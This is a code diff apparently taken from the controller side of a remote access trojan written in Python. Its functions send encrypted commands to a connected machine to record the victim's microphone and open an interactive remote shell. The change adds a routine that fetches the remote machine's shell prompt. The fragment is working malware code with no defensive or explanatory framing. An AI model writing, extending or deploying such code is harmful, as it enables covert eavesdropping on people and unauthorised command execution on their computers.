@@ -1,10 +1,9 @@
 from .encrypter import *
 from .system import system
-from colorama import Fore, init
+from colorama import Fore, init, Style
 from threading import *
 from cryptography.fernet import Fernet
-import struct
-import random
+import random, os, struct
 
 def recv_data(conn):
     try:
@@ -38,13 +37,15 @@ def mic(conn, address):
         f.close()
     print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: records/record{number}.wav")
     input("OK")
-
+def getInput(conn):
+    conn.send(encrypt(b"SHELLINFO"))
+    return recv_data(conn).decode()
 def shell(conn, address):
     conn.send(encrypt(b"MODE_SHELL"))
     try:
         print(decrypt(conn.recv(1024)).decode())
         while True:
-            cmd = input(Fore.LIGHTMAGENTA_EX + "$ ")
+            cmd = input(getInput(conn))
             if not cmd.strip():
                 continue
             conn.send(encrypt(cmd.encode()))
